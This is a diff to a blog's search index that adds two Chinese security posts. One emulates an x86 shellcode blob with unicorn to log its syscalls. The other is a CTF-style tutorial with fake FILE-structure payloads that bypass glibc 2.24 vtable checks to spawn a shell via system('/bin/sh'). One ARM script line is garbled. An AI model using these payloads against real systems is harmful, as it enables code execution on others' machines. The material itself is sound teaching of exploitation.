@@ -3,6 +3,129 @@
   
     
     <entry>
+      <title><![CDATA[unicorn模拟执行学习]]></title>
+      <url>/2018/01/17/learn_unicorn.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>unicorn</code> 是一个模拟执行软件，用于模拟执行各种平台的二进制文件，前几天在  <code>twitter</code> 上看到一篇文章，这里做个记录。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>记录系统调用</strong></p>
+<p>首先是一个简单的示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380</div></pre></td></tr></table></figure>
+<p>这是一段 <code>x86_32</code> 的  <code>shellcode</code>，可以用 <code>radare2</code> 反汇编它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rasm2 -a x86 -b 32 -d e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1516151145858iitndxo4.png?imageslim" alt="paste image"></p>
+<p>这里的目标是记录他的系统调用，在 <code>32</code> 中使用 <code>int 80</code> 来执行系统调用，所以我们在 执行 <code>int 80</code>  前 记录它的 寄存器信息，就可以记录系统调用了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from unicorn import *</div><div class="line">from unicorn.x86_const import *</div><div class="line"></div><div class="line"></div><div class="line">shellcode = &quot;e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380&quot;.decode(&quot;hex&quot;)</div><div class="line"></div><div class="line">BASE = 0x400000</div><div class="line">STACK_ADDR = 0x0</div><div class="line">STACK_SIZE = 1024*1024</div><div class="line"></div><div class="line">mu = Uc (UC_ARCH_X86, UC_MODE_32)</div><div class="line"></div><div class="line">mu.mem_map(BASE, 1024*1024)</div><div class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</div><div class="line"></div><div class="line"></div><div class="line">mu.mem_write(BASE, shellcode)</div><div class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE/2)</div><div class="line"></div><div class="line">def syscall_num_to_name(num):</div><div class="line">    syscalls = &#123;1: &quot;sys_exit&quot;, 15: &quot;sys_chmod&quot;&#125;</div><div class="line">    return syscalls[num]</div><div class="line"></div><div class="line">def hook_code(mu, address, size, user_data):</div><div class="line">    #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))  </div><div class="line">    </div><div class="line">    machine_code = mu.mem_read(address, size)</div><div class="line">    if machine_code == &quot;\xcd\x80&quot;:</div><div class="line">        </div><div class="line">        r_eax = mu.reg_read(UC_X86_REG_EAX)</div><div class="line">        r_ebx = mu.reg_read(UC_X86_REG_EBX)</div><div class="line">        r_ecx = mu.reg_read(UC_X86_REG_ECX)</div><div class="line">        r_edx = mu.reg_read(UC_X86_REG_EDX)</div><div class="line">        syscall_name = syscall_num_to_name(r_eax)</div><div class="line">        </div><div class="line">        print &quot;--------------&quot;</div><div class="line">        print &quot;We intercepted system call: &quot;+syscall_name</div><div class="line">        </div><div class="line">        if syscall_name == &quot;sys_chmod&quot;:</div><div class="line">            s = mu.mem_read(r_ebx, 20).split(&quot;\x00&quot;)[0]</div><div class="line">            print &quot;arg0 = 0x%x -&gt; %s&quot; % (r_ebx, s)</div><div class="line">            print &quot;arg1 = &quot; + oct(r_ecx)</div><div class="line">        elif syscall_name == &quot;sys_exit&quot;:</div><div class="line">            print &quot;arg0 = &quot; + hex(r_ebx)</div><div class="line">            exit()</div><div class="line">        </div><div class="line">        mu.reg_write(UC_X86_REG_EIP, address + size)</div><div class="line">        </div><div class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</div><div class="line"></div><div class="line">mu.emu_start(BASE, BASE-1)</div></pre></td></tr></table></figure>
+<p>关键就是使用 <code>mu.hook_add</code>, 使得在 <code>unicorn</code> 执行一条指令之前会先执行 <code>hook_code</code> 并且传入了与程序运行状态相关的参数，便于我们对程序状态进行操纵。在这里就是获取了 寄存器的值，然后根据系统调用号解析参数。</p>
+<p><strong>arm代码模拟执行</strong></p>
+<p>测试程序位于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://t.cn/RQ6viS6</div></pre></td></tr></table></figure></p>
+<p>其实就是执行一个递归函数，最后打印返回值</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1516152300740ox94gbho.png?imageslim" alt="paste image"></p>
+<p>我们的目标是加速程序的执行，可以加速的原理在于，这里是递归调用，对于的参数，返回值确定，所以我们就可以对已经执行过的参数，直接设置返回值，进而加速程序的运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">from unicorn import *</div><div class="line">from unicorn.arm_const import *</div><div class="line">import struct</div><div class="line"></div><div class="line">def read(name):</div><div class="line">    with open(name) as f:</div><div class="line">        return f.read()</div><div class="line">        </div><div class="line">def u32(data):</div><div class="line">    return struct.unpack(&quot;I&quot;, data)[0]</div><div class="line">    </div><div class="line">def p32(num):</div><div class="line">    return struct.pack(&quot;I&quot;, num)</div><div class="line"></div><div class="line"></div><div class="line">mu = Uc(UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</div><div class="line"></div><div class="line"></div><div class="line">BASE = 0x10000</div><div class="line">STACK_ADDR = </div><div class="line">STACK_SIZE = 1024*10240x300000</div><div class="line"></div><div class="line">mu.mem_map(BASE, 1024*1024)</div><div class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</div><div class="line"></div><div class="line"></div><div class="line">mu.mem_write(BASE, read(&quot;./task4&quot;))</div><div class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2)</div><div class="line"></div><div class="line">instructions_skip_list = []</div><div class="line"></div><div class="line">CCC_ENTRY = 0x000104D0</div><div class="line">CCC_END = 0x00010580</div><div class="line"></div><div class="line">stack = []                                          # Stack for storing the arguments</div><div class="line">d = &#123;&#125;                                              # Dictionary that holds return values for given function arguments </div><div class="line"></div><div class="line">def hook_code(mu, address, size, user_data):  </div><div class="line">    #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))</div><div class="line">    if address == CCC_ENTRY:                        # Are we at the beginning of ccc function?</div><div class="line">        arg0 = mu.reg_read(UC_ARM_REG_R0)           # Read the first argument. it is passed by R0</div><div class="line">        </div><div class="line">        if arg0 in d:                               # Check whether return value for this function is already saved.</div><div class="line">            ret = d[arg0]</div><div class="line">            mu.reg_write(UC_ARM_REG_R0, ret)        # Set return value in R0</div><div class="line">            mu.reg_write(UC_ARM_REG_PC, 0x105BC)    # Set PC to point at &quot;BX LR&quot; instruction. We want to return from fibonacci function</div><div class="line">            </div><div class="line">        else:</div><div class="line">            stack.append(arg0)                      # If return value is not saved for this argument, add it to stack.</div><div class="line">        </div><div class="line">    elif address == CCC_END:</div><div class="line">        arg0 = stack.pop()                          # We know arguments when exiting the function</div><div class="line">        </div><div class="line">        ret = mu.reg_read(UC_ARM_REG_R0)            # Read the return value (R0)</div><div class="line">        d[arg0] = ret                               # Remember the return value for this argument</div><div class="line">        </div><div class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</div><div class="line">mu.emu_start(0x00010584, 0x000105A8)</div><div class="line">return_value = mu.reg_read(UC_ARM_REG_R1)           # We end the emulation at printf(&quot;%d\n&quot;, ccc(x)).</div><div class="line">print &quot;The return value is %d&quot; % return_value</div></pre></td></tr></table></figure>
+<p>关键点，用一个数组存储了 <code>参数：返回值</code> 对， 从而规避一些冗余的运算。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> reverse </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> unicorn </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pwn with File结构体（四）]]></title>
+      <url>/2018/01/13/pwn_with_file_part4.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面几篇文章说道，<code>glibc 2.24</code> 对 <code>vtable</code> 做了检测，导致我们不能通过伪造 <code>vtable</code> 来执行代码。今天逛 <code>twitter</code> 时看到了一篇通过绕过 对<code>vtable</code> 的检测 来执行代码的文章，本文做个记录。</p>
+<p>文中涉及的代码，libc, 二进制文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/blog_data/blob/master/pwn_file/file_struct_part4.rar</div></pre></td></tr></table></figure>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先还是编译一个有调试符号的 <code>glibc</code> 来辅助分析。</p>
+<p>源码下载链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mirrors.ustc.edu.cn/gnu/libc/glibc-2.24.tar.bz2</div></pre></td></tr></table></figure></p>
+<p>可以参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/mycwq/article/details/38557997</div></pre></td></tr></table></figure></p>
+<p>新建一个目录用于存放编译文件，进入该文件夹(这里为<code>glibc_224</code> )，执行 <code>configure</code> 配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">mkdir glibc_224</div><div class="line">cd glibc_224/</div><div class="line">../glibc-2.24/configure --prefix=/home/haclh/workplace/glibc_224  --disable-werror  --enable-debug=yes</div></pre></td></tr></table></figure></p>
+<p>然后 <code>make -j8 &amp;&amp; make install</code>, 即可在 <code>/home/haclh/workplace/glibc_224</code> 找到编译好的 <code>libc</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854267668556jyfkc.png?imageslim" alt="paste image"></p>
+<p>对 <code>vtable</code> 进行校验的函数是 <code>IO_validate_vtable</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854356776exse0i7d.png?imageslim" alt="paste image"><br>就是保证 <code>vtable</code>  要在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间。</p>
+<p>绕过的方法是在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间找到可以利用的东西，下面介绍两种。</p>
+<p>前提：可以伪造 <code>FILE</code> 机构体</p>
+<p>测试代码 ( <a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">来源</a> )<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* gcc vuln.c -o vuln */</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">char fake_file[0x200];</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  FILE *fp;</div><div class="line">  puts(&quot;Leaking libc address of stdout:&quot;);</div><div class="line">  printf(&quot;%p\n&quot;, stdout); // Emulating libc leak</div><div class="line">  puts(&quot;Enter fake file structure&quot;);</div><div class="line">  read(0, fake_file, 0x200);</div><div class="line">  fp = (FILE *)&amp;fake_file;</div><div class="line">  fclose(fp);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>首先  <code>printf(&quot;%p\n&quot;, stdout)</code> 用来泄露 <code>libc</code> 地址，然后使用 <code>read</code> 读入数据用来伪造 <code>FILE</code> 结构体， 最后调用 <code>fclose(fp)</code>.</p>
+<p><strong>利用__IO_str_overflow</strong></p>
+<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的一个函数指针.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
+<p><code>_IO_str_jumps</code> 就位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间 所以我们是可以通过 <code>IO_validate_vtable</code> 的检测的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854871422xc7w9jfz.png?imageslim" alt="paste image"><br>具体怎么拿 <code>shell</code> 还得看看 <code>__IO_str_overflow</code> 的 <a href="https://code.woboq.org/userspace/glibc/libio/strops.c.html#_IO_str_overflow" target="_blank" rel="external">源代码</a>, 这里我就用 <code>ida</code> 看了（清楚一些）</p>
+<p>首先是对 <code>fp-&gt;_flag</code> 做了一些判断</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855084706pnihsyv9.png?imageslim" alt="paste image"><br>将 <code>fp-&gt;_flag</code> 设为 <code>0x0</code>, 就不会进入。接下来的才是重点</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855153693f1zfksay.png?imageslim" alt="paste image"></p>
+<p>可以看到 如果 设置 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</div></pre></td></tr></table></figure>
+<p>我们就能进入 <code>(fp[1]._IO_read_ptr)(2 * size + 100)</code>, 回到汇编看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855325659c257jd86.png?imageslim" alt="paste image"></p>
+<p>执行 <code>call    qword ptr [fp+0E0h]</code>， <code>fp+0E0h</code> 使我们控制的，于是可以控制 <code>rip</code>, 此时的参数为 <code>2 * size + 100</code>, 而 <code>size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> 所以此次 <code>call</code> 的参数也是可以控制的。</p>
+<p>利用思路就很简单了，设置 <code>fp+0xe0</code> 为 <code>system</code>, 同时设置 <code>fp-&gt;_IO_buf_end</code> 和 <code>fp-&gt;_IO_buf_base</code>, 使得 <code>2 * size + 100</code> 为 <code>/bin/sh</code> 的地址， 执行 <code>system(&quot;/bin/sh&quot;)</code> 获取 <code>shell</code>。</p>
+<p>比如<code>fp-&gt;_IO_buf_base=0</code> 和 <code>fp-&gt;_IO_buf_end=(sh-100)/2</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div></pre></td></tr></table></figure>
+<p>当执行 <code>fclose</code> 是会 调用 <code>_IO_FINISH (fp)</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855936790mnhxjuk7.png?imageslim" alt="paste image"></p>
+<p>其实就是 <code>fp-&gt;vtable-&gt;__finish</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</div></pre></td></tr></table></figure></p>
+<p>执行 <code>_IO_FINISH (fp)</code> 之前还对 锁进行了获取， 所以我们需要设置 <code>fp-&gt;_lock</code> 的值为一个 指向 <code>0x0</code> 的值（<code>*ptr=0x0000000000000000</code>），所以最终的 <code>file</code> 结构体的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line"># p _IO_str_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_jump_t + 0x8) # make __IO_str_overflow on __finish , which call by fclose</div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe0 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(system) # ((_IO_strfile *) fp)-&gt;_s._allocate_buffer</div></pre></td></tr></table></figure>
+<p>有一个小细节我把 <code>vtable</code> 设置为了 <code>p64(_IO_jump_t + 0x8)</code>,原因在于 一个正常的 <code>FILE</code> 结构体的 <code>vtable</code> 的结构为</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515856301831h58wszly.png?imageslim" alt="paste image"></p>
+<p><code>_finish</code> 在第三个字段</p>
+<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的第4个字段.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
+<p><code>vtable</code> 设置为 <code>p64(_IO_jump_t + 0x8)</code> 后， <code>vtable-&gt;_finish</code> 为 <code>__IO_str_overflow</code> 的地址了。</p>
+<p>在调用 <code>fclose</code> 处下个断点，断下来后打印第一个参数<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151585657581289u226j6.png?imageslim" alt="paste image"><br>可以看到 </p>
+<ul>
+<li><code>_flags</code> 域 为 0</li>
+<li><code>2*(buf_end - buf_base) + 100</code> 指向 <code>/bin/sh</code></li>
+<li><code>_lock</code> 指向 <code>0x0</code></li>
+<li>虚表的第三个表项（<code>vtable-&gt;_finish</code>）为 <code>__IO_str_overflow</code> 的地址</li>
+<li><code>$rdi+0xe0</code> 为 <code>system</code> 的地址(rdi即为 fp)</li>
+</ul>
+<p>这样在执行 <code>fclose</code> 时就会进入 <code>__IO_str_overflow</code> ，然后进入 <code>call    qword ptr [fp+0E0h]</code> 执行  <code>system(&quot;/bin/sh&quot;)</code> 拿到 <code>shell</code> </p>
+<p><strong>利用 _IO_wstr_finish</strong></p>
+<p><code>_IO_wstr_finish</code> 位于 <code>_IO_wstr_jumps</code> 里面</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857161075rcccf4qo.png?imageslim" alt="paste image"></p>
+<p>可以看到 <code>_IO_wstr_jumps</code>  也是位于 位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间的。</p>
+<p><code>_IO_wstr_finish</code>  的 <code>check</code> 比较简单</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857235249m55yixue.png?imageslim" alt="paste image"></p>
+<p>当 <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 不为0， 而且 <code>v2-&gt;_flags2</code> 就可以劫持 <code>rip</code> 了，看汇编代码会清晰不少</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515857376013zpcvyoh1.png?imageslim" alt="paste image"></p>
+<p>只需要在 <code>fp+0xa0</code> 处放置一个指针 <code>ptr</code> , 使得 <code>ptr+0x30</code> 处的 值不为 0 即可。（这个值随便找就行），然后 设置   <code>fp+0x74</code> 的值为 <code>0</code>， 最后设置 <code>fp+0xe8</code> 的值为 <code>one_shot</code> ，在执行 <code>fclose()</code>时就会去执行 <code>one_shot</code> 拿到 <code>shell</code></p>
+<p>伪造 <code>file</code> 结构体的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">fake_file = p64(0x0)  # flag</div><div class="line">fake_file += p64(0x0)    # read_ptr</div><div class="line">fake_file += p64(0x0)    # read_end</div><div class="line">fake_file += p64(0x0)    # read_base</div><div class="line"></div><div class="line"></div><div class="line">fake_file += p64(0x0)        # write_base</div><div class="line">fake_file += p64(sh) 		 # write_ptr - write_base  &gt; buf_end - buf_base, bypass check</div><div class="line">fake_file += p64(0x0)        # write_end</div><div class="line"></div><div class="line">fake_file += p64(0x0)   	 # buf_base</div><div class="line">fake_file += p64((sh-100)/2) # buf_end</div><div class="line"></div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0x88 - len(fake_file))  # padding for _lock</div><div class="line"></div><div class="line">fake_file += p64(0x00601273)   # ptr--&gt;0x0 , for bypass get lock</div><div class="line"></div><div class="line">fake_file +=  &quot;\x00&quot; * (0xa0 - len(fake_file)) </div><div class="line">fake_file += p64(0x601030) # _wide_data</div><div class="line"></div><div class="line"># p &amp;_IO_wstr_jumps</div><div class="line">fake_file += &quot;\x00&quot; * (0xd8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(_IO_wstr_jumps) </div><div class="line"></div><div class="line">fake_file += &quot;\x00&quot; * (0xe8 - len(fake_file))  # padding for vtable</div><div class="line">fake_file += p64(one_shot) # rip</div></pre></td></tr></table></figure></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>ida看代码比较清楚，文中的两种方法挺不错，利用了其他的 <code>vtable</code> 中的有趣的函数来绕过 <code>check</code></p>
+<p><strong>参考</strong></p>
+<p><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></p>
+<p><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/" target="_blank" rel="external">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> file struct </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[一步一步 Pwn RouterOS之exploit构造]]></title>
       <url>/2018/01/06/pwn_router_os_step_exp.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
@@ -2233,7 +2356,7 @@
       
         <categories>
             
-            <category> 安卓安全 </category>
+            <category> android </category>
             
         </categories>
         
